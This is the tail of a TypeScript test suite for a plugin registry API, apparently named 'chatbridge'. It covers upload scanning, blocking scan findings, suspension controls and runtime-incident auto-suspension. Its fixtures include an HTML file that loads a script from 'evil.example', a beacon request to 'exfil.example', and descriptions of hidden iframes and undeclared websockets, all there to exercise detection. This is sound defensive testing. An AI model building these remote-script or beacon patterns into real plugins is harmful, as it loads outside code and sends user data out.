              description: 'Field policy verification flow',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })
    const version = createVersionResponse.json()

    const zip = new JSZip()
    zip.file(
      'index.html',
      '<html><body><input name="student_name" /><img src="https://images.example.com/pixel.png" /><script src="https://cdn.allowed.example/app.js"></script></body></html>',
    )
    const zipBytes = Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }))
    const boundary = '----chatbridge-verify-fields-boundary'
    const multipartBody = Buffer.concat([
      Buffer.from(
        `--${boundary}\r\n`
          + 'Content-Disposition: form-data; name="artifact"; filename="verify-fields-lab.zip"\r\n'
          + 'Content-Type: application/zip\r\n\r\n',
        'utf8',
      ),
      zipBytes,
      Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8'),
    ])

    const uploadResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/developer/plugins/verify-fields-lab/versions/${version.id}/artifact`,
      headers: {
        'content-type': `multipart/form-data; boundary=${boundary}`,
      },
      payload: multipartBody,
    })
    expect(uploadResponse.statusCode).toBe(201)

    const verificationResponse = await server.inject({
      method: 'GET',
      url: `/api/v1/admin/plugins/verify-fields-lab/versions/${version.id}/policy-verification`,
    })

    expect(verificationResponse.statusCode).toBe(200)
    expect(verificationResponse.json()).toEqual(
      expect.objectContaining({
        findings: expect.arrayContaining([
          expect.objectContaining({
            code: 'RESOURCE-UNDECLARED',
            metadata: expect.objectContaining({
              resource: 'https://images.example.com/pixel.png',
            }),
          }),
          expect.objectContaining({
            code: 'INPUT-FIELD-UNDECLARED',
            metadata: expect.objectContaining({
              identifier: 'student_name',
            }),
          }),
        ]),
      }),
    )
  })

  it('auto-creates and persists successful scan runs during submission', async () => {
    const { version, scanRunsResponse } = await seedSubmittedPlugin(server, 'scan-http-lab')

    expect(scanRunsResponse.statusCode).toBe(200)
    expect(scanRunsResponse.json()).toEqual([
      expect.objectContaining({
        pluginId: 'scan-http-lab',
        pluginVersionId: version.id,
        status: 'completed',
        overallDisposition: 'pass',
      }),
    ])

    const listResponse = await server.inject({
      method: 'GET',
      url: `/api/v1/admin/plugins/scan-http-lab/versions/${version.id}/scan-runs`,
    })
    expect(listResponse.statusCode).toBe(200)
    expect(listResponse.json()).toEqual([
      expect.objectContaining({
        pluginVersionId: version.id,
        overallDisposition: 'pass',
      }),
    ])
  })

  it('marks versions as scan_failed during submission when auto-scan finds blocker findings', async () => {
    await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'scan-blocker-lab',
        name: 'Scan Blocker Lab',
        description: 'Auto scan blocker flow',
      },
    })

    const createVersionResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/scan-blocker-lab/versions',
      payload: {
        version: '1.0.0',
        manifest: {
          pluginId: 'scan-blocker-lab',
          name: 'Scan Blocker Lab',
          version: '1.0.0',
          description: 'Auto scan blocker flow',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: false,
          inputFields: [],
          permissions: [],
          networkDomains: ['api.allowed.example'],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: [],
          sriHashes: [],
          tools: [
            {
              name: 'scan_blocker_tool',
              description: 'Blocker scan flow',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })
    const version = createVersionResponse.json()

    const zip = new JSZip()
    zip.file('index.html', '<input name="student_name" /><script src="https://evil.example/app.js"></script>')
    const zipBytes = Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }))
    const boundary = '----chatbridge-scan-blocker'
    const multipartBody = Buffer.concat([
      Buffer.from(
        `--${boundary}\r\n`
          + 'Content-Disposition: form-data; name="artifact"; filename="scan-blocker-lab.zip"\r\n'
          + 'Content-Type: application/zip\r\n\r\n',
        'utf8',
      ),
      zipBytes,
      Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8'),
    ])

    await server.inject({
      method: 'POST',
      url: `/api/v1/developer/plugins/scan-blocker-lab/versions/${version.id}/artifact`,
      headers: {
        'content-type': `multipart/form-data; boundary=${boundary}`,
      },
      payload: multipartBody,
    })

    const submitResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/developer/plugins/scan-blocker-lab/versions/${version.id}/submit`,
    })
    expect(submitResponse.statusCode).toBe(200)
    expect(submitResponse.json()).toEqual(
      expect.objectContaining({
        status: 'scan_failed',
      }),
    )

    const scanRunsResponse = await waitForCompletedScanRun(server, 'scan-blocker-lab', version.id)
    const [scanRun] = scanRunsResponse.json()
    expect(scanRun).toEqual(
      expect.objectContaining({
        status: 'completed',
        overallDisposition: 'fail',
      }),
    )

    const failedReviewAttempt = await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/scan-blocker-lab/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id),
    })
    expect(failedReviewAttempt.statusCode).toBe(409)
  })

  it('supports plugin suspension controls and exposes runtime events over the registry update stream', async () => {
    const { version, scanRunsResponse } = await seedSubmittedPlugin(server, 'stream-control-lab')
    const [scanRun] = scanRunsResponse.json()

    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/stream-control-lab/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id),
    })
    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/stream-control-lab/versions/${version.id}/publish`,
    })

    const suspendResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/admin/plugins/stream-control-lab/suspend',
      payload: {
        actor: 'ops-admin',
        reason: 'kill switch drill',
      },
    })
    expect(suspendResponse.statusCode).toBe(200)
    expect(suspendResponse.json()).toEqual(expect.objectContaining({ status: 'suspended' }))

    const reinstateResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/admin/plugins/stream-control-lab/reinstate',
      payload: {
        actor: 'ops-admin',
        reason: 'drill complete',
      },
    })
    expect(reinstateResponse.statusCode).toBe(200)
    expect(reinstateResponse.json()).toEqual(expect.objectContaining({ status: 'approved' }))

    const auditResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/admin/plugins/stream-control-lab/audit',
    })
    expect(auditResponse.statusCode).toBe(200)
    expect(auditResponse.json().controlActions).toEqual([
      expect.objectContaining({ type: 'plugin_rolled_forward' }),
      expect.objectContaining({ type: 'plugin_suspended' }),
      expect.objectContaining({ type: 'plugin_reinstated' }),
    ])

    const updateResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/updates?pluginId=stream-control-lab',
    })
    expect(updateResponse.statusCode).toBe(200)
    expect(updateResponse.headers['content-type']).toContain('text/event-stream')
    expect(updateResponse.body).toContain('event: plugin_suspended')
    expect(updateResponse.body).toContain('event: plugin_reinstated')
  })

  it('ingests runtime violations, exposes incident evidence to admins, and auto-suspends on repeated high-severity signals', async () => {
    const { version, scanRunsResponse } = await seedSubmittedPlugin(server, 'runtime-monitor-lab')
    const [scanRun] = scanRunsResponse.json()

    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/runtime-monitor-lab/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id),
    })
    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/runtime-monitor-lab/versions/${version.id}/publish`,
    })

    for (const payload of [
      {
        pluginId: 'runtime-monitor-lab',
        pluginVersionId: version.id,
        eventType: 'runtime_violation',
        metadata: {
          severity: 'high',
          reason: 'hidden iframe bootstrap',
        },
      },
      {
        pluginId: 'runtime-monitor-lab',
        pluginVersionId: version.id,
        eventType: 'runtime_violation',
        metadata: {
          severity: 'high',
          reason: 'undeclared websocket destination',
        },
      },
      {
        pluginId: 'runtime-monitor-lab',
        pluginVersionId: version.id,
        eventType: 'unexpected_network_request',
        districtId: '550e8400-e29b-41d4-a716-446655440055',
        metadata: {
          severity: 'critical',
          observedDomain: 'exfil.example',
          requestUrl: 'https://exfil.example/beacon',
        },
      },
    ]) {
      const ingestResponse = await server.inject({
        method: 'POST',
        url: '/api/v1/registry/runtime-events',
        payload,
      })
      expect(ingestResponse.statusCode).toBe(202)
    }

    const incidentsResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/admin/plugins/runtime-monitor-lab/runtime-incidents',
    })
    expect(incidentsResponse.statusCode).toBe(200)
    expect(incidentsResponse.json()).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          eventType: 'unexpected_network_request',
          suspensionTriggered: true,
          metadata: expect.objectContaining({
            observedDomain: 'exfil.example',
          }),
        }),
      ]),
    )

    const policyResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/policies/runtime-monitor-lab',
    })
    expect(policyResponse.statusCode).toBe(200)
    expect(policyResponse.json()).toEqual(
      expect.objectContaining({
        status: 'suspended',
        killSwitchActive: true,
      }),
    )

    const auditResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/admin/plugins/runtime-monitor-lab/audit',
    })
    expect(auditResponse.statusCode).toBe(200)
    expect(auditResponse.json()).toEqual(
      expect.objectContaining({
        runtimeIncidents: expect.arrayContaining([
          expect.objectContaining({
            eventType: 'runtime_violation',
          }),
        ]),
        controlActions: expect.arrayContaining([
          expect.objectContaining({
            type: 'plugin_suspended',
            metadata: expect.objectContaining({
              actor: 'runtime_monitor',
              trigger: 'runtime_incident_threshold',
            }),
          }),
        ]),
      }),
    )
  })
})
